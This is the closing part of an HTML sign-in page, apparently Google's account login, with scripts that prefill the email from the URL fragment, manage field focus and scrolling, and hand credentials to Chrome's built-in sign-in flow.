Lbf/ygrTYnEoJyhGjCjfRJghQ9oWo+/hQdoGwHoHYSHcrcdIEKoVcfv3j4eAjgeF5GAO6Yhg=');
  </script>
<script>
  function gaia_parseFragment() {
  var hash = location.hash;
  var params = {};
  if (!hash) {
  return params;
  }
  var paramStrs = decodeURIComponent(hash.substring(1)).split('&');
  for (var i = 0; i < paramStrs.length; i++) {
      var param = paramStrs[i].split('=');
      params[param[0]] = param[1];
    }
    return params;
  }

  function gaia_prefillEmail() {
    var form = null;
    if (document.getElementById) {
      form = document.getElementById('gaia_loginform');
    }

    if (form && form.Email &&
        (form.Email.value == null || form.Email.value == '')
        && (form.Email.type != 'hidden')) {
      hashParams = gaia_parseFragment();
      if (hashParams['Email'] && hashParams['Email'] != '') {
        form.Email.value = hashParams['Email'];
      }
    }
  }

  
  try {
    gaia_prefillEmail();
  } catch (e) {
  }
  
</script>
<script>
  function gaia_setFocus() {
  var form = null;
  var isFocusableField = function(inputElement) {
  if (!inputElement) {
  return false;
  }
  if (inputElement.type != 'hidden' && inputElement.focus &&
  inputElement.style.display != 'none') {
  return true;
  }
  return false;
  };
  var isFocusableErrorField = function(inputElement) {
  if (!inputElement) {
  return false;
  }
  var hasError = inputElement.className.indexOf('form-error') > -1;
  if (hasError && isFocusableField(inputElement)) {
  return true;
  }
  return false;
  };
  var isFocusableEmptyField = function(inputElement) {
  if (!inputElement) {
  return false;
  }
  var isEmpty = inputElement.value == null || inputElement.value == '';
  if (isEmpty && isFocusableField(inputElement)) {
  return true;
  }
  return false;
  };
  if (document.getElementById) {
  form = document.getElementById('gaia_loginform');
  }
  if (form) {
  var userAgent = navigator.userAgent.toLowerCase();
  var formFields = form.getElementsByTagName('input');
  for (var i = 0; i < formFields.length; i++) {
        var currentField = formFields[i];
        if (isFocusableErrorField(currentField)) {
          currentField.focus();
          
          var currentValue = currentField.value;
          currentField.value = '';
          currentField.value = currentValue;
          return;
        }
      }
      
      
      
        for (var j = 0; j < formFields.length; j++) {
          var currentField = formFields[j];
          if (isFocusableEmptyField(currentField)) {
            currentField.focus();
            return;
          }
        }
      
    }
  }

  
  
    gaia_attachEvent(window, 'load', gaia_setFocus);
  
  
</script>
<script>
  var gaia_scrollToElement = function(element) {
  var calculateOffsetHeight = function(element) {
  var curtop = 0;
  if (element.offsetParent) {
  while (element) {
  curtop += element.offsetTop;
  element = element.offsetParent;
  }
  }
  return curtop;
  }
  var siginOffsetHeight = calculateOffsetHeight(element);
  var scrollHeight = siginOffsetHeight - window.innerHeight +
  element.clientHeight + 0.02 * window.innerHeight;
  window.scroll(0, scrollHeight);
  }
</script>
<script>
(function() {
  var $ = function(id) { return document.getElementById(id); };
  var gaiaLoginForm = $('gaia_loginform');
  var chromeExt = 'chrome-extension://mfffpogegjflfpflabcdkioaeobkgjik';
  var chromeSigninUrl = 'chrome://chrome-signin';
  var chromeOsUrl = 'chrome://oobe';
  var chromeWebview = undefined;
  onMessage = function(e) {
  if (e.origin == chromeSigninUrl || e.origin == chromeOsUrl) {
  chromeWebview = e.source;
  }
  };
  window.addEventListener('message', onMessage);
  gaia_onChromeLoginSubmit = function(e) {
  if (!chromeWebview && window == window.parent) {
  return;
  }
  if (gaiaLoginForm['Email'] && gaiaLoginForm['Passwd']) {
  var checkboxElement = $('advanced-box');
  var chooseWhatToSync = checkboxElement && checkboxElement.checked;
  var attemptToken = new Date().getTime();
  var msg = {method: 'attemptLogin',
  email: gaiaLoginForm['Email'].value,
  password: gaiaLoginForm['Passwd'].value,
  attemptToken: attemptToken,
  chooseWhatToSync: chooseWhatToSync};
  if (chromeWebview) {
  chromeWebview.postMessage(msg, chromeSigninUrl);
  } else {
  window.parent.postMessage(msg, chromeExt);
  }
  console.log('Credentials sent');
  var continueUrlElement = gaiaLoginForm['continue'];
  if (continueUrlElement) {
  var prevAttemptIndex = continueUrlElement.value.indexOf('?attemptToken');
  if (prevAttemptIndex != -1) {
  continueUrlElement.value = continueUrlElement.value.substr(
  0, prevAttemptIndex);
  }
  continueUrlElement.value += '?attemptToken=' + attemptToken;
  }
  }
  };
  gaia_attachEvent(gaiaLoginForm, 'submit', gaia_onChromeLoginSubmit);
})();
</script>
<script>
  (function(){
  var signinInput = document.getElementById('signIn');
  gaia_onLoginSubmit = function() {
  try {
  gaia.loginAutoRedirect.stop();
  } catch (err) {
  // do not prevent form from being submitted
  }
  try {
  document.bg.invoke(function(response) {
  document.getElementById('bgresponse').value = response;
  });
  } catch (err) {
  document.getElementById('bgresponse').value = '';
  }
  return true;
  }
  document.getElementById('gaia_loginform').onsubmit = gaia_onLoginSubmit;
  var signinButton = document.getElementById('signIn');
  gaia_attachEvent(window, 'load', function(){
  gaia_scrollToElement(signinButton);
  });
  })();
</script>
  </body>
</html>

